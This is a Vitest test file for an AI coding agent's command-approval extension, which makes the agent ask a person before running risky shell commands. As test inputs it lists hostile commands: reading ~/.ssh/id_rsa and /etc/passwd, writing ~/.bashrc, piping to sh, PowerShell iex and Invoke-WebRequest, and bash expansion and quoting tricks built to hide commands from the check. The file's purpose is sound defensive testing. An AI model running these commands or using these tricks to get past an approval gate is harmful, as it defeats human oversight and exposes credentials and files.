import { delimiter } from "node:path";
import { describe, expect, it } from "vitest";
import {
	commandAllowPattern,
	commandMatchesPattern,
	commandShellOf,
	isBuiltInAllowedCommand,
	isCommandAllowed,
	parsePlainBashWords,
} from "../src/core/command-allow-list.ts";
import type { ExtensionAPI, ExtensionContext } from "../src/core/extensions/types.ts";
import type { Settings } from "../src/core/settings-schema.ts";
import {
	type ApprovalRecord,
	type AskForApproval,
	createApprovalsExtension,
} from "../src/extensions/approvals/index.ts";
import { builtInExtensions } from "../src/extensions/index.ts";
import type { ApprovalAnswer } from "../src/modes/interactive/components/approval-box.ts";

type Handler = (event: unknown, ctx: ExtensionContext) => Promise<unknown>;

/** A working directory that does not exist, so no PATH entry of the test run lies inside it. */
const TEST_CWD = "/fingers-approvals-test-cwd";

function setup(answers: ApprovalAnswer[], settings: Settings = {}) {
	const asked: string[] = [];
	const askedCommands: string[] = [];
	const ask: AskForApproval = async (_ctx, request) => {
		asked.push(`${request.command} [${request.allowPattern}] ${request.reason}`);
		askedCommands.push(request.command);
		const answer = answers.shift();
		if (!answer) throw new Error("unexpected question");
		return answer;
	};
	let handler: Handler | undefined;
	const records: Array<{ customType: string; data: ApprovalRecord }> = [];
	const api = {
		on: (event: string, fn: Handler) => {
			if (event === "tool_call") handler = fn;
			return () => {};
		},
		getSettings: () => settings,
		appendEntry: (customType: string, data: ApprovalRecord) => records.push({ customType, data }),
	} as unknown as ExtensionAPI;
	createApprovalsExtension({ ask })(api);
	const call = (command: string, mode: ExtensionContext["mode"] = "tui", toolName = "bash") =>
		handler!({ type: "tool_call", toolCallId: "t1", toolName, input: { command } }, {
			mode,
			hasUI: mode === "tui" || mode === "rpc",
			cwd: TEST_CWD,
			sessionManager: { getSessionId: () => "session-1" },
		} as unknown as ExtensionContext);
	return { asked, askedCommands, call, records };
}

/** Calls each command, answering No, and returns the ones that ran without asking. */
async function ranWithoutAsking(commands: readonly string[]): Promise<string[]> {
	const { askedCommands, call } = setup(commands.map(() => ({ decision: "deny" }) as const));
	for (const command of commands) await call(command);
	return commands.filter((command) => !askedCommands.includes(command));
}

describe("approvals extension", () => {
	it("is a built-in extension", () => {
		expect(builtInExtensions.map((extension) => extension.name)).toContain("approvals");
	});

	it("runs read-only commands from the default allow list without asking", async () => {
		const { asked, call } = setup([]);
		expect(await call("git rev-parse --show-toplevel")).toBeUndefined();
		expect(await call("rg rateLimit src/")).toBeUndefined();
		expect(asked).toEqual([]);
	});

	it("asks before built-in commands whose arguments can run a program or write a file", async () => {
		const dangerous = [
			// rg runs a preprocessor program on every file.
			"rg --pre sh x .",
			"rg --pre=sh x .",
			"rg --pre-glob '*' --pre sh x",
			// fd runs programs (-x, -X) and tree writes files (-o): both are off the built-in list.
			"fd . -x curl -o /tmp/p https://example.test/p",
			"fd -X sh /tmp/p",
			"fd foo",
			"tree -o ~/.zshrc",
			"tree",
			// git writes the diff to a file or runs an external diff program, also through abbreviations.
			"git diff --output=~/.bashrc",
			"git diff --output /tmp/x",
			"git diff --outp=/tmp/x",
			"git log -p --output=/tmp/x",
			"git show --output=/tmp/x HEAD",
			"git diff --ext-diff",
			"git diff --ext",
			"git -c core.pager=sh log",
			"git --exec-path=/tmp status",
			// git status runs core.fsmonitor; git diff, log -p and show run diff.external or a textconv
			// program. The write tool can set those in .git/config without asking, so they ask.
			"git status",
			"git status --short",
			"git diff",
			"git diff --stat HEAD~1",
			"git log -p",
			"git log --oneline -5",
			"git show HEAD",
			// git branch only lists: no delete, move, force or creating a branch.
			"git branch -D main",
			"git branch -d main",
			"git branch --delete main",
			"git branch -m main old",
			"git branch -M main",
			"git branch --move main old",
			"git branch -f main HEAD~3",
			"git branch --force main",
			"git branch new-feature",
			// file compiles a magic file; date sets the clock.
			"file -C -m magic",
			"file -bC x",
			"date -s 2020-01-01",
			"date --set=2020-01-01",
			"date 0101000020",
		];
		expect(await ranWithoutAsking(dangerous)).toEqual([]);
	});

	it("asks when quoting, expansion or a glob could hide an option from the check", async () => {
		const hidden = [
			'git diff "--output=/tmp/x"',
			"git diff '--output'=/tmp/x",
			"git diff --out\\put=/tmp/x",
			// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion, not a template
			"git diff --${unset}output=/tmp/x",
			"git diff $'\\x2d-output=/tmp/x'",
			"git diff {--output=/tmp/x,}",
			// A file named --pre=sh in the folder would become an option.
			"rg foo *",
			"rg foo ?-pre=sh",
		];
		expect(await ranWithoutAsking(hidden)).toEqual([]);
	});

	it("asks for every shell expansion in a built-in command's arguments", async () => {
		// Each of these runs a program through an argument of a built-in command. The first three ran
		// `touch` under macOS /bin/bash 3.2 through arithmetic in an array subscript; `${x@P}` is prompt
		// expansion (bash 4.4+); `$'\x24'` spells `$` without typing it.
		const expansions = [
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"echo ${y:=$'a[\\x24(touch P1)]'} ${x:=abc} ${x:y}",
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"echo ${y:=$'a[\\x24(touch P2)]'} ${a[y]}",
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"cat ${y:=$'a[\\x24(touch P4)]'} ${a[y]}",
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"echo ${x@P}",
			"echo $x",
			"cat $HOME/.ssh/id_rsa",
			"echo $'\\x24(touch P)'",
			'echo $"x"',
			"echo $(touch P)",
			"echo `touch P`",
			"echo $((a[1]))",
			"echo $[1+1]",
			'echo "$(touch P)"',
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			'echo "${x@P}"',
			'echo "`touch P`"',
			'echo "$x"',
			"ls <(touch P)",
			"ls >(touch P)",
			"cat <<< x",
			"cat <<EOF",
			"cat < /etc/passwd",
			"echo x >> ~/.bashrc",
			"echo x 2>/tmp/x",
			"echo x &> /tmp/x",
			"echo x & touch P",
			"echo x; touch P",
			"echo x | sh",
			"echo x\ntouch P",
			"echo (touch P)",
			"echo {a,b}",
			"echo a[1]",
			"ls [ab]",
			"echo !!",
			'echo "!!"',
			"echo # comment",
			"echo 'unclosed",
			'echo "unclosed',
			"echo trailing\\",
			"echo a\u202eb",
			"echo 'a\u202eb'",
		];
		expect(await ranWithoutAsking(expansions)).toEqual([]);
		for (const command of expansions) {
			expect(isBuiltInAllowedCommand(command)).toBe(false);
			expect(isCommandAllowed(command, ["echo", "cat", "ls"])).toBe(false);
		}
	});

	it("asks for the same expansions after a person's own allow pattern", async () => {
		const tricks = [
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"cat foo ${y:=$'a[\\x24(touch P)]'} ${a[y]}",
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"cat foo ${x@P}",
			"cat foo $(touch P)",
			"cat foo <(touch P)",
			"cat foo $((1))",
		];
		const { asked, call } = setup(
			tricks.map(() => ({ decision: "deny" }) as const),
			{ approvals: { allow: ["cat foo"] } },
		);
		for (const command of tricks) await call(command);
		expect(asked).toHaveLength(tricks.length);
	});

	it("checks the arguments a built-in command receives, after quotes and escapes", async () => {
		const hidden = [
			'rg x "--pre=sh"',
			"rg x '--pre'=sh",
			"rg x --p\\re=sh",
			"rg x --pre\\ sh",
			"git rev-parse '--output=/tmp/x'",
			'git branch "-D" main',
			'date "-s" 2020-01-01',
			'file "-b C"',
			"file '-bC'",
		];
		expect(await ranWithoutAsking(hidden)).toEqual([]);
	});

	it("still runs read-only uses of the built-in commands without asking", async () => {
		const readOnly = [
			"ls -la src",
			"ls *.ts",
			'grep -rn "rate limit" src',
			"cat package.json",
			"rg -n rateLimit src/ --type ts",
			"rg --no-ignore -tts rateLimit",
			"rg -iS -C3 --hidden -g '*.ts' --json rateLimit src",
			"rg -gz rateLimit",
			"rg -e -foo src",
			"git branch --show-current",
			"git rev-parse --show-toplevel",
			"git rev-parse --abbrev-ref HEAD",
			"git rev-parse --is-inside-work-tree",
			"date",
			"date -u +%Y-%m-%dT%H:%M:%S",
			'date "+%Y %m"',
			"file -b README.md",
			// Quotes and escapes that only keep text literal.
			"rg 'rate limit' src",
			"echo 'costs $5 (`not run`)'",
			'cat "my notes.md" my\\ file.txt',
			"grep -rn 'a|b' src",
			"ls café/",
			"cat ''",
		];
		const { asked, call } = setup([]);
		for (const command of readOnly) expect(await call(command)).toBeUndefined();
		expect(asked).toEqual([]);
	});

	it("records each decision in the session, built-in read-only commands included", async () => {
		const { call, records } = setup(
			[{ decision: "allow_once" }, { decision: "allow_always" }, { decision: "deny", message: "use make test" }],
			{ approvals: { allow: ["npm test"] } },
		);
		await call("ls src");
		await call("make build");
		await call("pnpm vitest run a.test.ts");
		await call("pnpm vitest run b.test.ts");
		await call("npm test -- --watch=false");
		await call("make deploy");
		expect(records.map(({ customType, data }) => ({ customType, ...data }))).toEqual([
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "ls src",
				pattern: "ls src",
				decision: "allowed_by_rule",
				rule: "built_in",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "make build",
				pattern: "make build",
				decision: "allow_once",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "pnpm vitest run a.test.ts",
				pattern: "pnpm vitest",
				decision: "allow_always",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "pnpm vitest run b.test.ts",
				pattern: "pnpm vitest",
				decision: "allowed_by_rule",
				rule: "session",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "npm test -- --watch=false",
				pattern: "npm test",
				decision: "allowed_by_rule",
				rule: "settings",
			},
			{
				customType: "approval",
				sessionId: "session-1",
				toolCallId: "t1",
				tool: "bash",
				command: "make deploy",
				pattern: "make deploy",
				decision: "deny",
				message: "use make test",
			},
		]);
	});

	it("asks before a command outside the allow list and runs it on Yes", async () => {
		const { asked, call } = setup([{ decision: "allow_once" }, { decision: "allow_once" }]);
		expect(await call("pnpm vitest run src/server/routes/auth.test.ts")).toBeUndefined();
		expect(await call("pnpm vitest run src/server/routes/auth.test.ts")).toBeUndefined();
		expect(asked).toEqual([
			"pnpm vitest run src/server/routes/auth.test.ts [pnpm vitest] Not in your allow list.",
			"pnpm vitest run src/server/routes/auth.test.ts [pnpm vitest] Not in your allow list.",
		]);
	});

	it("remembers always allow for the rest of the session", async () => {
		const { asked, call } = setup([{ decision: "allow_always" }]);
		expect(await call("pnpm vitest run a.test.ts")).toBeUndefined();
		expect(await call("pnpm vitest run b.test.ts")).toBeUndefined();
		expect(asked).toHaveLength(1);
	});

	it("blocks on No and tells the model what the user said", async () => {
		const { call } = setup([{ decision: "deny", message: "use the existing helper" }, { decision: "deny" }]);
		expect(await call("npm install left-pad")).toEqual({
			block: true,
			reason: "The user did not allow this command and said what to do instead: use the existing helper",
		});
		expect(await call("npm install left-pad")).toEqual({
			block: true,
			reason: "The user did not allow this command.",
		});
	});

	it("never uses the built-in list for PowerShell, whose (…) arguments run commands", async () => {
		const commands = [
			"echo (Start-Process calc)",
			"cat (iex 'whoami')",
			"ls -Path (Invoke-WebRequest http://x -OutFile p)",
			"ls",
			"cat README.md",
			"git rev-parse --show-toplevel",
		];
		const { asked, call } = setup(commands.map(() => ({ decision: "deny" }) as const));
		for (const command of commands) {
			expect(await call(command, "tui", "powershell")).toMatchObject({ block: true });
		}
		expect(asked).toHaveLength(commands.length);
	});

	it("asks for PowerShell subexpressions, variables, splats and script blocks even with an allowed prefix", async () => {
		const tricks = [
			"npm test (Start-Process calc)",
			"npm test $(iex whoami)",
			"npm test $env:SECRET",
			"npm test @(calc)",
			"npm test @args",
			"npm test {calc}",
			"npm test [Diagnostics.Process]::Start('calc')",
		];
		const { asked, call, records } = setup(
			tricks.map(() => ({ decision: "deny" }) as const),
			{
				approvals: { allow: ["npm test"] },
			},
		);
		for (const command of tricks) await call(command, "tui", "powershell");
		expect(asked).toHaveLength(tricks.length);
		// A plain PowerShell command still matches the person's own allow pattern.
		expect(await call("npm test -- --watch=false", "tui", "powershell")).toBeUndefined();
		expect(records.at(-1)?.data).toMatchObject({ tool: "powershell", decision: "allowed_by_rule", rule: "settings" });
	});

	it("always asks for chained or redirected commands, even with an allowed prefix", async () => {
		const { asked, call } = setup([{ decision: "allow_once" }, { decision: "allow_once" }]);
		await call("git rev-parse HEAD && rm -rf build");
		await call("cat secrets.txt > /tmp/out");
		expect(asked).toHaveLength(2);
	});

	it("asks for rg options that run a program, and for any rg option it does not know", async () => {
		const dangerous = [
			// --hostname-bin runs a program to name the host for hyperlinks (ripgrep 14+).
			"rg --hostname-bin=./evil.sh x",
			"rg --hostname-bin ./evil.sh x",
			"rg x . --hostname-bin=node_modules/.bin/tsc",
			// -z runs decompressors found on PATH, alone or in a short-option group.
			"rg -z x .",
			"rg -iz x .",
			"rg -nzi x",
			"rg --search-zip x",
			// --pre and --pre-glob run a preprocessor.
			"rg --pre=sh x",
			"rg --pre-glob=* x",
			// An option that takes a value does not hide the next argument, and -- does not end the check:
			// in `-e -- -z` rg reads -- as the pattern and -z as an option.
			"rg -e --hostname-bin=./evil.sh x",
			"rg --glob --pre=sh x",
			"rg -e -- -z x",
			"rg -- --hostname-bin=./evil.sh x",
			// Options that are not on the list, including ones rg may add later.
			"rg --hyperlink-format=default x",
			"rg --hostn=./evil.sh x",
			"rg -P x",
			"rg --some-future-option x",
		];
		expect(await ranWithoutAsking(dangerous)).toEqual([]);
	});

	it("runs git rev-parse and git branch without asking only in forms that read no index or object", async () => {
		// git runs core.fsmonitor when it reads the index, and a promisor remote's transport (ext::,
		// core.sshCommand) when an object is missing; the write tool can set both in .git/config.
		const dangerous = [
			"git rev-parse :a.txt",
			"git rev-parse --verify :a.txt",
			"git rev-parse :0:a.txt",
			"git rev-parse 0123abc~0",
			"git rev-parse ghost~1",
			"git rev-parse HEAD",
			"git rev-parse --verify HEAD",
			"git rev-parse --show-toplevel :a.txt",
			"git rev-parse --abbrev-ref ghost",
			// Listing reads commits for -v, and for any branch.sort a plain listing does too.
			"git branch",
			"git branch -v",
			"git branch -vv",
			"git branch -a",
			"git branch --list",
			"git branch --show-current -v",
		];
		expect(await ranWithoutAsking(dangerous)).toEqual([]);
	});

	it("uses no allow rule when shellPath names a shell that quotes unlike bash", async () => {
		// fish reads \' as an escape inside single quotes, so `;touch P;` below is not quoted there; bash
		// sees two quoted words.
		const fishPayload = "echo 'a\\'X' ;touch P; echo \\'";
		expect(parsePlainBashWords(fishPayload)).toBeDefined();
		for (const shellPath of ["/opt/homebrew/bin/fish", "/usr/bin/nu", "C:\\tools\\elvish.exe"]) {
			const { asked, call } = setup([{ decision: "deny" }, { decision: "deny" }, { decision: "deny" }], {
				shellPath,
				approvals: { allow: ["echo"] },
			});
			await call("ls");
			await call(fishPayload);
			await call("echo hi");
			expect(asked).toHaveLength(3);
			expect(asked[0]).toContain("Your shellPath is not bash, sh, dash or zsh");
		}
		// A PATH without `~/…` entries, which zsh and dash would look up under the working directory.
		const savedPath = process.env.PATH;
		process.env.PATH = ["/usr/bin", "/bin"].join(delimiter);
		try {
			for (const shellPath of ["/bin/zsh", "/usr/bin/dash", "/bin/sh", "C:\\Program Files\\Git\\bin\\bash.exe"]) {
				const { asked, call } = setup([], { shellPath });
				expect(await call("ls")).toBeUndefined();
				expect(asked).toEqual([]);
			}
		} finally {
			process.env.PATH = savedPath;
		}
		expect(commandShellOf("bash", "/opt/homebrew/bin/fish")).toBe("other");
		expect(commandShellOf("bash", "/bin/BASH")).toBe("bash");
		expect(commandShellOf("powershell", "/opt/homebrew/bin/fish")).toBe("powershell");
		expect(commandMatchesPattern("echo", "echo hi", "other")).toBe(false);
		expect(isBuiltInAllowedCommand("ls", "other")).toBe(false);
	});

	it("asks for built-in commands while PATH has a folder the write tool can fill without asking", async () => {
		const saved = process.env.PATH;
		try {
			for (const path of [
				[".", "/usr/bin", "/bin"],
				["/usr/bin", "", "/bin"],
				["node_modules/.bin", "/usr/bin"],
				[`${TEST_CWD}/node_modules/.bin`, "/usr/bin"],
			]) {
				process.env.PATH = path.join(delimiter);
				expect(await ranWithoutAsking(["ls", "cat README.md", "rg foo"]), path.join(delimiter)).toEqual([]);
			}
			process.env.PATH = [".", "/usr/bin"].join(delimiter);
			const { asked, call } = setup([{ decision: "deny" }]);
			await call("ls");
			expect(asked[0]).toMatch(/PATH/);
			process.env.PATH = ["/usr/bin", "/bin"].join(delimiter);
			expect(await ranWithoutAsking(["ls"])).toEqual(["ls"]);
			// `~/bin`: bash (the default shell) looks in the home directory; zsh and dash (sh here) in ./~/bin.
			if (process.platform !== "win32") {
				process.env.PATH = ["~/bin", "/usr/bin", "/bin"].join(delimiter);
				expect(await ranWithoutAsking(["ls"])).toEqual(["ls"]);
				const sh = setup([{ decision: "deny" }], { shellPath: "/bin/sh" });
				await sh.call("ls");
				expect(sh.asked[0]).toMatch(/PATH/);
			}
		} finally {
			process.env.PATH = saved;
		}
	});

	it("asks for rg while RIPGREP_CONFIG_PATH names a config file, unless --no-config comes first", async () => {
		const saved = process.env.RIPGREP_CONFIG_PATH;
		try {
			process.env.RIPGREP_CONFIG_PATH = "/tmp/ripgreprc";
			expect(await ranWithoutAsking(["rg foo", "rg -e --no-config foo", "rg --no-config foo"])).toEqual([
				"rg --no-config foo",
			]);
		} finally {
			if (saved === undefined) delete process.env.RIPGREP_CONFIG_PATH;
			else process.env.RIPGREP_CONFIG_PATH = saved;
		}
	});

	it("asks only in the terminal", async () => {
		const { asked, call } = setup([]);
		expect(await call("make deploy", "print")).toBeUndefined();
		expect(await call("make deploy", "rpc")).toBeUndefined();
		expect(await call("make deploy", "json")).toBeUndefined();
		expect(asked).toEqual([]);
	});

	it("follows the approvals setting", async () => {
		const never = setup([], { approvals: { commands: "never" } });
		expect(await never.call("make deploy")).toBeUndefined();
		const allow = setup([], { approvals: { allow: ["npm test"] } });
		expect(await allow.call("npm test -- --watch=false")).toBeUndefined();
		expect(never.asked.concat(allow.asked)).toEqual([]);
	});

	it("leaves other tools alone", async () => {
		const { asked, call } = setup([]);
		expect(await call("anything", "tui", "read")).toBeUndefined();
		expect(asked).toEqual([]);
	});
});

describe("command allow list", () => {
	it("matches whole leading words only", () => {
		expect(commandMatchesPattern("git status", "git status --short")).toBe(true);
		expect(commandMatchesPattern("git status", "git stash")).toBe(false);
		expect(commandMatchesPattern("ls", "lsof -i")).toBe(false);
		expect(commandMatchesPattern("", "ls")).toBe(false);
		expect(isCommandAllowed("echo $(rm -rf x)", ["echo"])).toBe(false);
		// `(` is shell syntax in bash too: not a plain word, so it asks.
		expect(commandMatchesPattern("echo", "echo (calc)")).toBe(false);
		expect(commandMatchesPattern("npm test", "'npm' test --watch=false")).toBe(true);
		expect(commandMatchesPattern("npm test", '"npm test"')).toBe(false);
		expect(commandMatchesPattern("npm test", "np? test")).toBe(false);
		expect(commandMatchesPattern("echo", "echo (calc)", "powershell")).toBe(false);
		expect(isCommandAllowed("echo (calc)", ["echo"], "powershell")).toBe(false);
		expect(isCommandAllowed("echo hi", ["echo"], "powershell")).toBe(true);
		expect(commandAllowPattern("  pnpm   vitest run x ")).toBe("pnpm vitest");
	});
});

describe("plain bash words", () => {
	it("gives the words a program receives, after quotes and escapes", () => {
		expect(parsePlainBashWords(`  rg  -n 'rate limit' "a \\"b\\" \\c" x\\ y *.ts ''`)).toEqual([
			{ value: "rg", glob: false },
			{ value: "-n", glob: false },
			{ value: "rate limit", glob: false },
			{ value: 'a "b" \\c', glob: false },
			{ value: "x y", glob: false },
			{ value: "*.ts", glob: true },
			{ value: "", glob: false },
		]);
		expect(parsePlainBashWords("")).toEqual([]);
	});

	it("refuses every form it cannot prove literal", () => {
		for (const command of [
			// biome-ignore lint/suspicious/noTemplateCurlyInString: bash parameter expansion, not a template
			"echo ${x}",
			"echo $x",
			"echo `x`",
			"echo <(x)",
			"cat <<< x",
			"echo $((1))",
			"echo {a,b}",
		]) {
			expect(parsePlainBashWords(command)).toBeUndefined();
		}
	});
});
